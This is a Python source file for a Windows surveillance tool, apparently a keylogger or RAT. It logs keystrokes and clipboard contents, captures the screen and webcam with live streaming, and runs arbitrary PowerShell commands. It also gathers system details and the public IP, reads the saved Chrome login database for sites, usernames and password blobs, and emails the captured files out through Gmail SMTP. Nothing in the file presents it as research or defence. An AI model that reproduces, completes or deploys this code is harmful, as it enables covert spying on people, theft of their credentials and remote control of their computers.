# from scipy.io.wavfile import write
# import sounddevice
import win32clipboard
import json
import datetime
from PIL import ImageGrab
import os
import time
import numpy
import cv2
import pyautogui
from win32api import GetSystemMetrics as reso
import requests
import platform
import sqlite3
from socket import gethostname, gethostbyname
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from threading import Thread
from pynput.keyboard import Key, Listener


# ==================================================================================================

with open(r"Constants.json") as file:
    CONSTANTS = json.load(file)
PATH = CONSTANTS['FilePath']
screenFPS = 6
webCamFPS = 8
DIMENTIONS = (reso(0), reso(1))

# ==================================================================================================

def copyClipBoard(duration=10, debug=False):
    log = None
    endTime = time.time() + duration
    while time.time() < endTime:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if log == data: continue
        except:
            data = None
        else:
            mark = f'\n{"="*50}{datetime.datetime.now().strftime(r"%y/%m/%d-%H:%M:%S")}{"="*50}\n'
            with open(PATH + 'ClipBoard.txt', 'a') as file:
                file.write(mark)
                file.write(data)
            if debug: print('ClipBoard Copied')
            log = data
    else:
        if debug: print('Clipboard copying Stopped')
        return 'ClipBoard.txt'


def screenShot():
    fileName = 'screenShot' + datetime.datetime.now().strftime(r"%y%m%d%H%M%S")+'.png'
    ImageGrab.grab().save(PATH + fileName)
    return fileName


def executeInTerminal(command, debug):
    outputFile = PATH + 'output.txt'
    if debug: print(f'Executing {command}')
    os.system(rf'powershell.exe {command} > {outputFile}')
    if debug: print('Executed')
    try:
        with open(outputFile) as file:
            message = file.read()
        os.remove(outputFile)
        return ('OUTPUT', message)
    except FileNotFoundError:
        return None
    except BaseException as error:
        return ('ERROR', error)


def screenRecording(duration=10, isLive=False, sendFunction=None, debug=False):
    codec = cv2.VideoWriter_fourcc(*"XVID")
    fileName = 'screenRec' + datetime.datetime.now().strftime(r"%y%m%d%H%M%S") + '.avi'
    videoPath = PATH + fileName
    video = cv2.VideoWriter(videoPath, codec, screenFPS, DIMENTIONS)
    endTime = time.time() + duration
    if debug: print('Recording Screen')
    while True:
        if time.time() >= endTime: break
        img = pyautogui.screenshot()
        img = numpy.array(img)
        img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
        video.write(img)
        if isLive:
            try: sendFunction('STREAM', img)
            except: print("Couldn't send" if debug else None)
    if debug: print('Recorded')
    video.release()
    cv2.destroyAllWindows()
    return fileName


def webCamRecording(duration=10, source=0, isLive=False, sendFunction=None, debug=False):
    endTime = time.time() + duration
    webCam = cv2.VideoCapture(source, cv2.CAP_DSHOW)
    fileName = 'vid' + datetime.datetime.now().strftime(r"%y%m%d%H%M%S") + '.avi'
    videoPath = PATH + fileName
    code = cv2.VideoWriter_fourcc(*'MP42')
    video = cv2.VideoWriter(videoPath, code, webCamFPS, (640, 480))
    if debug: print('Recording WebCam')
    while True:
        if time.time() > endTime: break
        ret, frame = webCam.read()
        if ret: video.write(frame)
        if isLive:
            try: sendFunction('STREAM', frame)
            except: print("Couldn't send" if debug else None)
    if isLive: sendFunction('UPDATE', 'EndOfStream')
    if debug: print('Recorded')
    cv2.destroyAllWindows()
    webCam.release()
    video.release()
    return fileName


def systemInfo():
    data = {
        'architecture': '',
        'machine': '',
        'node': '',
        'platform': '',
        'processor': '',
        'release': '',
        'system': '',
        'version': '',
    }
    for key in data.keys():
        data[key] = eval(f'platform.{key}()')
    data['name'] = gethostname()

    data['privateIP'] = gethostbyname(data['name'])
    try:
        data['publicIP'] = requests.get("https://api64.ipify.org").text
    except Exception:
        data['publicIP'] = 'Could not Connect'

    with open(PATH + 'SystemInfo.json', 'w') as file:
        json.dump(data, file)
    
    return 'SystemInfo.json'

# def audioRecording(duration=10, fs=44100):
#     sounddevice.default.samplerate = fs
#     sounddevice.default.channels = 2
#     recording = sounddevice.rec(int(duration * fs))
#     sounddevice.wait()
#     write(PATH + 'rec' + datetime.datetime.now().strftime(r"%y%m%d%H%M%S") + '.wav', fs, recording)

def getChromePasswords():
    dataBase = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    if not os.path.exists(dataBase): return None
    connection = sqlite3.connect(dataBase)
    cursor = connection.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    rawData = cursor.fetchall()
    cursor.close()
    data = []
    for login in rawData:
        # password = win32crypt.CryptUnprotectData(login[2], None, None, None, 0)[1]
        password = login[2]
        data.append({'WebSite': login[0], 'UserName': login[1], 'PassWord': password})
    return data

def sendEmail(subject='', text='', filename='', filePath=''):
    constants = CONSTANTS["Email"]
    fromAddress = constants['fromId']
    toAddress = constants['toId']
    message = MIMEMultipart()
    message['From'] = fromAddress
    message['To'] = toAddress
    message['Subject'] = subject
    body = constants['body']
    body = body[0] + subject + body[1] + subject + body[2] + text + body[3]
    message.attach(MIMEText(body, 'html'))

    attachment = open(filePath, 'rb')
    payLoad = MIMEBase('application', 'octet-stream')
    payLoad.set_payload((attachment).read())
    encoders.encode_base64(payLoad)
    payLoad.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    message.attach(payLoad)
    message = message.as_string()

    try:
        session = smtplib.SMTP('smtp.gmail.com', 587)
        session.starttls()
        session.login(fromAddress, constants['password'])
        session.sendmail(fromAddress, toAddress, message)
        session.quit()
        attachment.close()
        return True
    except:
        return False

class KeyLogger:
    def __init__(self, running=False):
        self.running = running
        self.keys = []
        self.count = 0
        self.path = PATH + 'KeyStrokes.txt'
        self.newSessionMarker()
        Thread(target=self.start).start()

    def start(self):
        with Listener(on_press=self.onPress, on_release=self.onRelease) as listener:
            listener.join()

    def newSessionMarker(self):
        mark = f'\n{"="*50}{datetime.datetime.now().strftime(r"%y/%m/%d-%H:%M:%S")}{"="*50}\n'
        with open(self.path, 'a') as file:
            file.write(mark)

    def onPress(self, key):
        if self.running:
            try:
                self.keys.append(key.char)
            except AttributeError:
                if key == Key.space: temp = ' '
                elif key == Key.enter: temp = '\n'
                else: temp = ''
                key = '<'+str(key).replace('Key.', '')+'>' + temp
                self.keys.append(key)
            if len(self.keys) >= 10: self.write()
        else: pass

    def write(self):
        if self.keys:
            self.keys = list(map(str, self.keys))
            with open(self.path, 'a') as file:
                file.write(''.join(self.keys))
            self.keys = []

    def onRelease(self, key):
        pass

if __name__ == '__main__':
    k = KeyLogger(True)
    
